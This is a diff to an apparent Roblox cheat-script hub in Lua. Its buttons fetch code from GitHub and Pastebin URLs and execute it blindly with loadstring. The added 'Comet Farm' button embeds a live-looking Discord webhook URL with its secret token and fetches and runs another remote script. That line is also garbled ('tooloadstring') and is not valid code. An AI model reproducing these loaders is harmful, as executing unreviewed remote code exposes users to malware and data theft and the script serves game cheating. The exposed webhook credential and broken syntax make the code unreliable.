@@ -72,6 +72,10 @@ psxbtns:Button("Huge Games Pet Sim X", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/Project/main/Huge%20Games.lua"))()
 end)
 
+psxbtns:Button("Comet Farm (Rejoin to turn off)", function()
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS" tooloadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/Scripts2023/main/COMETFARM"))()  
+end)
+
 rebtns:Button("Ragdoll Engine Troll Hub", function()
 loadstring(game:HttpGet("https://pastebin.com/raw/PB8ER7j3"))()
 end)
